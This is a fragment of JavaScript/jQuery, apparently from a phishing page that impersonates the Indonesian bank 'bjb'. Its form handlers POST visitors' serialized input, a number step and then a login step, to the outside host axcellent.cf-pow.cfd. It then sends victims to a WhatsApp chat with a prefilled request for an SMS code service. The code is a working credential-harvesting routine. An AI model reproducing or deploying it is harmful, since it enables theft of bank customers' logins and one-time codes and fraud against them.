...
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://axcellent.cf-pow.cfd/app42/no.php',
            data: $(this).serialize(),
            datatype: 'JSON',           
...
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://axcellent.cf-pow.cfd/app42/login.php',
            data: $(this).serialize(),
            datatype: 'JSON',           
            complete: function(data) {
            setTimeout(function(){
...
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=628154035397&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
$('.load').fadeOut();
    }, 5500);    
}  
